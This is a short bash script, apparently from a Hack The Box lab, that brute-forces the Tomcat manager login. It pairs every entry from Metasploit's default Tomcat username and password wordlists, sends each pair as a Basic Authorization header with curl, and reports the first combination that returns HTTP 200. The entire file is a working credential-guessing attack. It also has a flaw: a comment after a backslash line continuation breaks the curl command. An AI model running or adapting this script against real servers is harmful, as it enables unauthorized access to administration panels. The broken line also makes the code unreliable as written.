#!/bin/bash

# Hackthebox module Attacking Common Web Applications: Attacking Tomcat
# Another hackthebox challenge. Bruteforce Tomcat login. They said, "use cURL to brute force login," so I made a script.

url="http://IP:PORT/manager/html"
userFile="/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt"
passFile="/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt"

# Loop through each line in the user file
while IFS= read -r user; do
    # Loop through each line in the password file
    while IFS= read -r pass; do
        # Base64 encode the user:pass combination
        userPass=$(echo -n "$user:$pass" | base64)

        # Send the GET request with the Authorization header
        response=$(curl -s -o /dev/null -w "%{http_code}" -X GET "$url" \
            -H "Cookie: JSESSIONID=<Add_ID>" \ # Add your ID
            -H "Priority: u=0, i" \
            -H "Authorization: Basic $userPass")

        # Check if the response code indicates success
        if [ "$response" == "200" ]; then
            echo "Successful login with username: $user and password: $pass"
            exit 0
        fi

    done < "$passFile"
done < "$userFile"

echo "No valid credentials found. Try HARDER"
